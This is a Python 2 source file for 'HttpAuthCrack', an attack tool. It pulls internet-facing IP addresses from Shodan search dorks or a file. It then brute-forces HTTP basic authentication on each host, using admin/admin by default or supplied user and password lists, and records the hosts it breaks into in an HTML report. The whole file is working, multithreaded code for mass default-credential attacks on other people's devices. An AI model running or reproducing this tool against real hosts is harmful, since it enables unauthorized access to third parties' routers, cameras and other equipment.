#!/usr/bin/env python
# HttpAuthCrack.py
#
# Description:
# From a list of IPs, check the basic auth with the credentials given or using admin/admin by default.
# To create the list of IPs, you can use a Shodan query or a file with an IP per line
# Note that shodan API only give 100 results per query instead of the real number of results found.
#
# Output:
# An html file with a list of IPs with access granted and the credentials working for these IPs
#
# Dependencies:
# 	Shodan library: easy_install shodan
#
# Usage example:
#   httpauthcrack.py -u user -p pass -s "linksys port:80" -v
#
# Author:
# Ignacio Sorribas (a.k.a. H4rds3c)         sorribas[at]gmail.com / hardsec[at]gmail.com
# http://hardsec.net
#
# Versions:
#
# v0.1 (2013/08/08)
#   First release.
# v0.2 (2014/02/04)
#   - Added port 8080 from shodan results to list of IPs.
#   - Fix a bug in the arguments command line
#   - Added option -d / --port to look for into shodan results
#   - Optimised to avoid create all threads specified by -t switch if they aren't needed
# v0.3 (2014/02/09)
#   - Filter of false positives on many IP phone devices.
#   - Optimized code from "check_basic_auth" function.
# v0.4 (2014/02/27)
#   - Fix bugs in "test_host" function
#   - Separate log functions in other file
#   - Add colors to output
#   - Add report dir with templates for header.html and footer.html to make the reports.
#   - the output report is stored in the output folder
#   - Embeded logo added to the html report

import sys
import getopt
import urllib2
import time
import datetime
import Queue
import threading
import os
from lib import Log

version = "0.4"

SHODAN_API_KEY = 'Your API key here'
REPORT_PATH = "output/"
RHEADER = "report/header.html" # File with report template header
RFOOTER = "report/footer.html" # File with report template footer


# Flag to control threads
exitFlag = 0    

class myThread (threading.Thread):
    def __init__(self, threadID, q):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.q = q
    
    def run(self):
        Log.info("Starting Thread %d" % self.threadID)
        process_ips(self.threadID, self.q)
        Log.info("Exiting Thread %d" % self.threadID)

def process_ips(threadID, q):
    while not exitFlag:
        queueLock.acquire()
        if not workQueue.empty():
            ip = q.get()
            queueLock.release()
            host = "http://"+ip
            Log.info("Thread %s Checking %s" % (threadID, host))
            try:
                source = urllib2.urlopen(host, timeout=1).read()
            except Exception, e:
                if str(e).find('401') > 0:
                    check_basic_auth(host)
            except KeyboardInterrupt:
                sys.exit()
        else:
            queueLock.release()
        time.sleep(1)

def shodan_search(term):
    """ Search in shodan using the dork received as parameter and return a list of IPs. """
    from shodan import Shodan 
    api = Shodan(SHODAN_API_KEY)
    try:
        results = api.search(term)
    except Exception, e:
        print 'Error: %s' % e
    return results

def check_basic_auth(host):
    """ Check for Basic Auth valid credentials of given host"""
    if userfile:
        for user in userlist:
            if passfile:
                for passwd in passlist:
                    if test_host(host,user,passwd) < 0:
                        return
            else:
                if test_host(host,user,_passwd) < 0:
                    return
    elif passfile:
        for passwd in passlist:
            if test_host(host,_user,passwd) < 0:
                return
    else:
        if test_host(host,_user,_passwd) < 0:
            return

def test_host(host,user,passwd):
    """Test the basic auth in host given using usr and pass given. """
    try:
        Log.info("["+host+"] Checking %s/%s" %(user,passwd))
        passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
        passman.add_password(None, host, user, passwd)
        authhandler = urllib2.HTTPBasicAuthHandler(passman)
        opener = urllib2.build_opener(authhandler)
        urllib2.install_opener(opener)
        source = urllib2.urlopen(host, timeout=5)
        if len(str(source)) > 0:
	    # Some devices show an html page after a number of tries to avoid bruteforce. We discard those.
            html = str(source.read())
            if html.find('HTTP 401') > 0:
                Log.warn("["+host+"] HTTP 401 found in html. Possibly false positive. Omitting from output")
                return -1
            # Access granted using admin/admin
            Log.success("Access granted with "+user+"/"+passwd+" to "+host)
            outputLock.acquire()
            output.writelines("<tr><td><a href="+host+" target=\"_blank\">"+host+"</a></td><td>"+user+"</td><td>"+passwd+"</td></tr>")
            outputLock.release()
            return -1  # return -1 to stop looking in a host when we have access to.
        return 0
    except Exception, e:
        Log.err("["+host+"] Error: %s" % e)
        return 0       
    except KeyboardInterrupt:
        sys.exit()
 
def build_iplist_from_shodan(sh_res):
    """ Build a list of IP addresses from the shodan query results. """
    list = []
    for result in sh_res['matches']:
        if (result['port'] == 80):
            list.append(result['ip'])
        if (result['port'] == 8080):
            ipaux=result['ip']+":"+str(result['port'])
            list.append(ipaux)
        if (_port != 0) and (result['port'] == _port):
            ipaux=result['ip']+":"+str(result['port'])
            list.append(ipaux)
    return list

def build_list_from_file(f):
    """ Build a list of IP addresses from the given file. """
    list = []
    lfile = open(f,"r")
    for i in lfile:
        list.append(i.strip())
    return list

def main(argv):
    try:
        opts, args = getopt.getopt(argv, "hu:p:s:U:P:I:t:d:v", ["help", "user=", "passwd=", "shodan=", "userfile=", "passfile=", "iplist=", "threads=", "port=", "verbose"])
    except getopt.GetoptError:
        usage()
        sys.exit(2)
    global _user
    global _passwd
    global _dork
    global _port
    global userfile
    global passfile
    global ipsfile
    global th_num
    _user = 'admin'     # Default user
    _passwd = 'admin'   # Default password
    _dork = ""
    _port = 0
    th_num = 10  # by default we use 10 threads
    userfile = ""
    passfile = ""
    ipsfile = ""
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit()
        elif opt in ("-u", "--user"):
            _user = arg
        elif opt in ("-p", "--passwd"):
            _passwd = arg
        elif opt in ("-U", "--userfile"):
            userfile = arg
        elif opt in ("-P", "--passfile"):
            passfile = arg
        elif opt in ("-s", "--shodan"):
            _dork = arg
        elif opt in ("-I", "--iplist"):
            ipsfile = arg
        elif opt in ("-t", "--threads"):
            th_num = int(arg)
        elif opt in ("-d", "--port"):
            _port = int(arg)
        elif opt in ("-v", "--verbose"):
            Log.debug(1)
    

def usage():
    print "\nUsage: "+sys.argv[0]+" [options]\n"
    print "Options:"
    print "\t-h\t\t\t# print this screen"
    print "\t--help\t\t\t#\n"
    print "\t-s shodan_dork\t\t# search terms to launch the shodan query (use quotes if dork has whitespaces)"
    print "\t--shodan shodan_dork\t# Combined with -I option, merges IPs from both sources\n"
    print "\t-u username\t\t# username to use with basic auth (default admin)"
    print "\t--user username \t#\n"
    print "\t-p password\t\t# password to use with basic auth (default admin)"
    print "\t--passwd password\t#\n"
    print "\t-U userfile\t\t# file with users to try the basic auth"
    print "\t--userfile userfile\t#\n"
    print "\t-P passfile\t\t# file with passwords to try with each user"
    print "\t--passfile passfile\t#\n"
    print "\t-I iplistfile\t\t# file with ips to try (One IP[:port] per line)"
    print "\t--iplist iplistfile\t#\n"
    print "\t-t num_threads\t\t# Number of threads to use in operations (10 by default)"
    print "\t--threads num_threads\t#\n"
    print "\t-d num_port\t\t# Port number to use in operations (80 and 8080 by default)"
    print "\t--port num_port\t\t#\n"
    print "\t-v\t\t\t# Verbose output"
    print "\t--verbose\t\t#\n"


#def log(msg):
#    if (_debug == 1):
#        sys.stdout.write("DEBUG: " + msg + "\n")

if __name__ == '__main__':
    # This code runs when script is started from command line
    main(sys.argv[1:])
    iplist = []
    if _dork:
        print "Dork: "+_dork
        res = shodan_search(_dork)
        print 'Results found: %s' % res['total']
        iplist = build_iplist_from_shodan(res)
        if ipsfile:
            iplist2 = []
            iplist2 = build_list_from_file(ipsfile)
            iplist = list(set(iplist + iplist2))
    elif ipsfile:
        iplist = build_list_from_file(ipsfile)
    else:
        print "\nYou need to specify -s or -I option\n"
        usage()
        sys.exit()

    print 'Elements to test: %d' % len(iplist)

    if userfile:
        userlist = []
        userlist = build_list_from_file(userfile)

    if passfile:
        passlist = []
        passlist = build_list_from_file(passfile)

    # Output to save the results
    global output
    now = datetime.datetime.now()
    if not os.path.exists(REPORT_PATH):
        os.makedirs(REPORT_PATH)
    outputname = REPORT_PATH+"results" + now.strftime("%Y-%m-%d-%H-%M")+ ".html"
    output = open(outputname,"w+")

    # Create a Queue to fill with ips
    workQueue = Queue.Queue(len(iplist))
    # Create Locks for output and for queue.
    queueLock = threading.Lock()
    outputLock = threading.Lock()

    outputLock.acquire()
    #write the report header.
    aux = open(RHEADER,"r")
    output.writelines(aux.read())
    aux.close()
    if _dork:
        output.writelines("<h1>Dork: %s</h1>" % _dork)
    output.writelines("<h2>Total tested elements: %d</h2>" % len(iplist))
    output.writelines("<table><tr><th>Host</th><th>Username</th><th>Password</th></tr>")
    outputLock.release()

    threads = []
    threadID = 1
    try:
        # Create new Threads
        if len(iplist) < th_num:
            th_num = len(iplist)
        for i in range(th_num):
            thread = myThread(threadID, workQueue)
            thread.start()
            threads.append(thread)
            threadID += 1

        # Fill the Queue
        queueLock.acquire()
        for ip in iplist:
            workQueue.put(ip)
        queueLock.release()

        # wait for Queue to empty
        while not workQueue.empty():
            pass

        # Notify threads is time to exit
        exitFlag = 1

        # Wait for all trheads to complete
        for t in threads:
            t.join()

        # End html log and close the file
        aux = open(RFOOTER,"r")
        outputLock.acquire()
        output.writelines("</table>")
        output.writelines("<br><br><div>Report generated by HttpAuthCrack v"+version+" on "+datetime.datetime.now().strftime("%Y/%m/%d %H:%M")+"</div>")
        output.writelines(aux.read())
        outputLock.release()
        aux.close()
        output.close()
    except KeyboardInterrupt, e:
        Log.warn("Terminating all Threads due to Keyboard Interrupt...")
        outputLock.acquire()
        output.writelines("<h2>Execution stoped by user!!!</h2>")
        outputLock.release()
        exitFlag = 1
        # End html log and close the file
        aux = open(RFOOTER,"r")
        outputLock.acquire()
        output.writelines(aux.read())
        outputLock.release()
        aux.close()
        output.close()

    print "Exiting Main Thread"

